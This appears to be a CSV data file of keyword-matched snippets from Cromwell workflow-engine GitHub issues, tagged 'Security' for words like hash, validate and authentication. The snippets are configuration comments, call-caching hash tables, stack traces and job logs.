Security,"27 / 26 Docker hash consistency, develop edition.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2361:15,hash,hash,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2361,1,['hash'],['hash']
Security,"28000; #tsv = 128000; #map = 128000; #object = 128000; }. abort {; # These are the default values in Cromwell, in most circumstances there should not be a need to change them. # How frequently Cromwell should scan for aborts.; scan-frequency: 30 seconds. # The cache of in-progress aborts. Cromwell will add entries to this cache once a WorkflowActor has been messaged to abort.; # If on the next scan an 'Aborting' status is found for a workflow that has an entry in this cache, Cromwell will not ask; # the associated WorkflowActor to abort again.; cache {; enabled: true; # Guava cache concurrency.; concurrency: 1; # How long entries in the cache should live from the time they are added to the cache.; ttl: 20 minutes; # Maximum number of entries in the cache.; size: 100000; }; }. # Cromwell reads this value into the JVM's `networkaddress.cache.ttl` setting to control DNS cache expiration; dns-cache-ttl: 3 minutes; }. docker {; hash-lookup {; # Set this to match your available quota against the Google Container Engine API; #gcr-api-queries-per-100-seconds = 1000. # Time in minutes before an entry expires from the docker hashes cache and needs to be fetched again; #cache-entry-ttl = ""20 minutes"". # Maximum number of elements to be kept in the cache. If the limit is reached, old elements will be removed from the cache; #cache-size = 200. # How should docker hashes be looked up. Possible values are ""local"" and ""remote""; # ""local"": Lookup hashes on the local docker daemon using the cli; # ""remote"": Lookup hashes on docker hub, gcr, gar, quay; #method = ""remote""; enabled = ""false""; }; }. # Here is where you can define the backend providers that Cromwell understands.; # The default is a local provider.; # To add additional backend providers, you should copy paste additional backends; # of interest that you can find in the cromwell.example.backends folder; # folder at https://www.github.com/broadinstitute/cromwell; # Other backend providers include SGE, SLURM, Docker, udocker, ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:3998,hash,hash-lookup,3998,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['hash'],['hash-lookup']
Security,29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:continueOnReturnCode|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output expression:File sorted_bam|816FBD6EEA5D806309AA0664E2F2AB86|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output expression:File sorted_bam|816FBD6EEA5D806309AA0664E2F2AB86|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:3199,hash,hashes,3199,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,2AB86|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output expression:File sorted_bam|816FBD6EEA5D806309AA0664E2F2AB86|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCach,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:3447,hash,hashes,3447,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,2WomCallableMaker.scala:11); 	at wom.transforms.WomCallableMaker$Ops.toWomCallable(WomCallableMaker.scala:8); 	at wom.transforms.WomCallableMaker$Ops.toWomCallable$(WomCallableMaker.scala:8); 	at wom.transforms.WomCallableMaker$ops$$anon$1.toWomCallable(WomCallableMaker.scala:8); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomCallNodeMaker$.toWomCallNode(WdlDraft2WomCallNodeMaker.scala:129); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomCallNodeMaker$.toWomCallNode(WdlDraft2WomCallNodeMaker.scala:21); 	at wom.transforms.WomCallNodeMaker$Ops.toWomCallNode(WomCallNodeMaker.scala:9); 	at wom.transforms.WomCallNodeMaker$Ops.toWomCallNode$(WomCallNodeMaker.scala:9); 	at wom.transforms.WomCallNodeMaker$ops$$anon$1.toWomCallNode(WomCallNodeMaker.scala:9); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.buildNode$1(WdlDraft2WomGraphMaker.scala:68); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.$anonfun$toWomGraph$3(WdlDraft2WomGraphMaker.scala:38); 	at common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.foldFunction$1(WdlDraft2WomGraphMaker.scala:37); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.$anonfun$toWomGraph$14(WdlDraft2WomGraphMaker.scala:98); 	at scala.collection.LinearSeqOptimized.foldLeft(LinearSeqOptimized.scala:122); 	at scala.collection.LinearSeqOptimized.foldLeft$(LinearSeqOptimized.scala:118); 	at scala.collection.immutable.List.foldLeft(List.scala:86); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.toWomGraph(WdlDraft2WomGraphMaker.scala:98); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.toWomGraph(WdlDraft2WomGraphMaker.scala:18); 	at wom.transforms.WomGraphMaker$Ops.toWomGraph(WomGraphMaker.scala:8); 	at wom.transforms.WomGraphMaker$Ops.toWomGraph$(WomGraphMaker.scala:8); 	at wom.transforms.WomGraphMaker$ops$$anon$1.toWomGraph(WomGraphMaker.scala:8); 	at wdl.transforms.draft2.wdlom2wom.WdlDraf,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502:3208,validat,validation,3208,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502,1,['validat'],['validation']
Security,"2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.white_brits' (scatter index: None, attempt 1); [2022-12-15 21:23:03,67] [info] Assigned new job execution tokens to the following groups: 9e4f5894: 3; [2022-12-15 21:23:03,69] [info] BT-322 9e4f5894:main.categorical_covariates:0:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:23:03,70] [info] BT-322 9e4f5894:main.ethnicity_self_report:-1:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:23:03,70] [info] BT-322 9e4f5894:main.pcs:-1:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:27:50,35] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.assessment_ages:-1:1-20000000002 [9e4f5894main.assessment_ages:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:27:50,35] [info] BT-322 9e4f5894:main.assessment_ages:-1:1 cache hit copying success with aggregated hashes: initial = EEC3507DAE39FE605FDE6F9F6FC0A5A8, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:50,35] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.assessment_ages:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:50,48] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.assessment_ages' (scatter index: None, attempt 1); [2022-12-15 21:27:50,82] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.genetic_sex:-1:1-20000000011 [9e4f5894main.genetic_sex:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:27:50,82] [info] BT-322 9e4f5894:main.genetic_sex:-1:1 cache hit copying success with aggregated hashes: initial = FD7DC79B974CF6706FC3376F067965B9, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:50,82] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecuti",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:28837,hash,hashes,28837,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
Security,"3-7708-4627-babd-47017753d512/call-MakeAnalysisReadyBam/processing.MakeAnalysisReadyBam/ac5adb53-d888-4b9f-b062-48504e1a4853/call-BaseRecalibrator/shard-9/ 2> gsutil_output.txt; RC_GSUTIL=$?; if [ \""$RC_GSUTIL\"" = \""1\"" ]; then\n grep \""Bucket is requester pays bucket but no user project provided.\"" gsutil_output.txt && echo \""Retrying with user project\""; gsutil -u bioinfo-prod -h \""Content-Type: text/plain; charset=UTF-8\"" cp /cromwell_root/stdout gs://temporary-files/PET508-001/workspace/SingleSampleGenotyping/b67b285a-1f63-4514-b472-8618f1082470/call-ubam2bam/from_ubam.to_bam_workflow/4306b863-7708-4627-babd-47017753d512/call-MakeAnalysisReadyBam/processing.MakeAnalysisReadyBam/ac5adb53-d888-4b9f-b062-48504e1a4853/call-BaseRecalibrator/shard-9/; fi ; RC=$?; if [ \""$RC\"" = \""0\"" ]; then break; fi; sleep 5; done; return \""$RC\""; }; retry"": Copying file: ///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]... / [0 files][ 0.0 B/ 76.3 KiB] ServiceException: 401 Requester pays bucket access requires authentication. Copying file:///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]... / [0 files][ 0.0 B/ 76.3 KiB] ServiceException: 401 Requester pays bucket access requires authentication. Copying file:///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]... / [0 files][ 0.0 B/ 76.3 KiB] ServiceException: 401 Requester pays bucket access requires authentication. ""; }],; message: ""Workflow failed""; }],; message: ""Workflow failed""; }; ],; ```. This step is executed in a scatter way, 17x per analysis (distinct genomic interval for each shard). Bellow follows the cromwell script of the shard that processed chromosome 12 and 13:. ```bash; #!/bin/bash. cd /cromwell_root; tmpDir=$(mkdir -p ""/cromwell_root/tmp.a7701249"" && echo ""/cromwell_root/tmp.a7701249""); chmod 777 ""$tmpDir""; export _JAVA_OPTIONS=-Djava.io.tmpdir=""$tmpDir""; export TMPDIR=""$tmpDir""; export HOME=""$HOME""; (; cd /cromwell_root. ); oute4a6eeab=""${tmpDir}/out.$$"" erre4a6eeab=""${",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435847865:1750,access,access,1750,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435847865,2,"['access', 'authenticat']","['access', 'authentication']"
Security,"31b3cf0f2da failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; running cwltool on file /tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl failed with Traceback (most recent call last):; File ""/home/dyuen/test/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/heterodon/__init__.py"", line 24, in apply; File ""<string>"", line 1, in <module>; File ""<string>"", line 12, in cwltool_salad; File ""/home/dyuen/test/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/cwltool/load_tool.py"", line 279, in validate_document; File ""/home/dyuen/test/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/schema_salad/ref_resolver.py"", line 915, in resolve_all; File ""/home/dyuen/test/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/schema_salad/ref_resolver.py"", line 1087, in validate_links; schema_salad.validate.ValidationException: ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:24:1: checking field steps; ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:30:3: checking object ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl#checker; ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:31:5: Field run contains undefined reference to file:///tmp/cwl_temp_dir_2148913290991206234/checker/md5sum_checker.cwl; ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:25:3: checking object ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl#md5sum; ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:26:5: Field run contains undefined reference to file",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4366#issuecomment-437395477:3428,Validat,ValidationException,3428,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4366#issuecomment-437395477,1,['Validat'],['ValidationException']
Security,32); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:264); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:261); at com.typesafe.config.impl.ConfigImpl$LoaderCache.getOrElseUpdate(ConfigImpl.java:66); at com.typesafe.config.impl.ConfigImpl.computeCachedConfig(ConfigImpl.java:93); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:261); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:237); at cromwell.languages.util.ImportResolver$HttpResolver$.apply(ImportResolver.scala:237); at womtool.input.WomGraphMaker$.importResolvers$lzycompute$1(WomGraphMaker.scala:28); at womtool.input.WomGraphMaker$.importResolvers$1(WomGraphMaker.scala:27); at womtool.input.WomGraphMaker$.$anonfun$getBundleAndFactory$1(WomGraphMaker.scala:39); at scala.util.Either.flatMap(Either.scala:352); at womtool.input.WomGraphMaker$.getBundleAndFactory(WomGraphMaker.scala:30); at womtool.input.WomGraphMaker$.fromFiles(WomGraphMaker.scala:46); at womtool.validate.Validate$.validate(Validate.scala:26); at womtool.WomtoolMain$.dispatchCommand(WomtoolMain.scala:54); at womtool.WomtoolMain$.runWomtool(WomtoolMain.scala:161); at womtool.WomtoolMain$.delayedEndpoint$womtool$WomtoolMain$1(WomtoolMain.scala:166); at womtool.WomtoolMain$delayedInit$body.apply(WomtoolMain.scala:27); at scala.Function0.apply$mcV$sp(Function0.scala:42); at scala.Function0.apply$mcV$sp$(Function0.scala:42); at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:17); at scala.App.$anonfun$main$1(App.scala:98); at scala.App.$anonfun$main$1$adapted(App.scala:98); at scala.collection.IterableOnceOps.foreach(IterableOnce.scala:575); at scala.collection.IterableOnceOps.foreach$(IterableOnce.scala:573); at scala.collection.AbstractIterable.foreach(Iterable.scala:933); at scala.App.main(App.scala:98); at scala.App.main$(App.scala:96); at womtool.WomtoolMain$.main(WomtoolMain.scala:27); at womtool.WomtoolMain.main(WomtoolMain.scala); Caused by: com.typesafe.config.Config,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:3620,Validat,Validate,3620,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['Validat'],['Validate']
Security,"32d67e-3e95-40c8-acbd-d42f75040f1b""; }; ```. Before:; ```; ERROR - Cannot construct WomMapType(WomStringType,WomAnyType) with mixed types in map values: [WomString(Hello World), WomObject(Map(first -> WomString(Hello World), number -> WomInteger(2)),WomCompositeType(Map(first -> WomStringType, number -> WomIntegerType),Some(firstLayer)))]; java.lang.UnsupportedOperationException: Cannot construct WomMapType(WomStringType,WomAnyType) with mixed types in map values: [WomString(Hello World), WomObject(Map(first -> WomString(Hello World), number -> WomInteger(2)),WomCompositeType(Map(first -> WomStringType, number -> WomIntegerType),Some(firstLayer)))]; 	at wom.values.WomMap.<init>(WomMap.scala:79); 	at wom.values.WomMap$.apply(WomMap.scala:54); 	at wom.values.WomMap$.coerceMap(WomMap.scala:34); 	at wom.values.WomMap$.apply(WomMap.scala:50); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$5.$anonfun$evaluateValue$12(LiteralEvaluators.scala:90); 	at cats.data.Validated.map(Validated.scala:559); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$5.evaluateValue(LiteralEvaluators.scala:87); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$5.evaluateValue(LiteralEvaluators.scala:73); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$ops$$anon$1.evaluateValue(ValueEvaluator.scala:10); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:36); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:22); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.express",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7385:2307,Validat,Validated,2307,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7385,1,['Validat'],['Validated']
Security,"4); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:459); at akka.actor.ActorCell.systemInvoke(ActorCell.scala:483); at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:282); at akka.dispatch.Mailbox.run(Mailbox.scala:223); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.RuntimeException: Google credentials are invalid: 500 Internal Server Error; {; ""error"" : ""internal_failure""; }; at cromwell.filesystems.gcs.auth.GoogleAuthMode$class.validate(GoogleAuthMode.scala:66); at cromwell.filesystems.gcs.auth.GoogleAuthMode$class.validateCredential(GoogleAuthMode.scala:62); at cromwell.filesystems.gcs.auth.RefreshTokenMode.validateCredential(GoogleAuthMode.scala:127); at cromwell.filesystems.gcs.auth.RefreshTokenMode.credential(GoogleAuthMode.scala:147); at cromwell.filesystems.gcs.GcsPathBuilder.<init>(GcsPathBuilder.scala:57); at cromwell.filesystems.gcs.GcsPathBuilderFactory.withOptions(GcsPathBuilderFactory.scala:37); at cromwell.backend.impl.jes.JesWorkflowPaths.<init>(JesWorkflowPaths.scala:25); at cromwell.backend.impl.jes.JesWorkflowPaths.copy(JesWorkflowPaths.scala:19); at cromwell.backend.impl.jes.JesWorkflowPaths.withDescriptor(JesWorkflowPaths.scala:54); at cromwell.backend.io.WorkflowPaths$class.toJobPaths(WorkflowPaths.scala:51); at cromwell.backend.impl.jes.JesWorkflowPaths.toJobPaths(JesWorkflowPaths.scala:19); at cromwell.backend.io.WorkflowPaths$class.toJobPaths(WorkflowPaths.scala:36); at cromwell.backend.impl.jes.JesWorkflowPaths.toJobPaths(JesWorkflowPaths.scala:19); at cromwell.backend.standard.StandardCachingActorHelper$class.jobPaths(StandardCachingActorHelper.scala:64); at cromwell.backend.impl.j",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2270:2132,validat,validateCredential,2132,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2270,1,['validat'],['validateCredential']
Security,"40c8-acbd-d42f75040f1b""; }; ```. Before:; ```; ERROR - Cannot construct WomMapType(WomStringType,WomAnyType) with mixed types in map values: [WomString(Hello World), WomObject(Map(first -> WomString(Hello World), number -> WomInteger(2)),WomCompositeType(Map(first -> WomStringType, number -> WomIntegerType),Some(firstLayer)))]; java.lang.UnsupportedOperationException: Cannot construct WomMapType(WomStringType,WomAnyType) with mixed types in map values: [WomString(Hello World), WomObject(Map(first -> WomString(Hello World), number -> WomInteger(2)),WomCompositeType(Map(first -> WomStringType, number -> WomIntegerType),Some(firstLayer)))]; 	at wom.values.WomMap.<init>(WomMap.scala:79); 	at wom.values.WomMap$.apply(WomMap.scala:54); 	at wom.values.WomMap$.coerceMap(WomMap.scala:34); 	at wom.values.WomMap$.apply(WomMap.scala:50); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$5.$anonfun$evaluateValue$12(LiteralEvaluators.scala:90); 	at cats.data.Validated.map(Validated.scala:559); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$5.evaluateValue(LiteralEvaluators.scala:87); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$5.evaluateValue(LiteralEvaluators.scala:73); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$ops$$anon$1.evaluateValue(ValueEvaluator.scala:10); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:36); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:22); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEva",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7385:2321,Validat,Validated,2321,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7385,1,['Validat'],['Validated']
Security,47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:docker|4AD3C387725244C1348F252B031B956D|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:continueOnReturnCode|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:continueOnReturnCode|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output expression:File sorted_bam|816FBD6EEA5D806309AA0664E2F2AB86|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output expression:File sorted_bam|816FBD6EEA5D806309AA0664E2F2AB86|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:S,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:2961,hash,hashes,2961,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
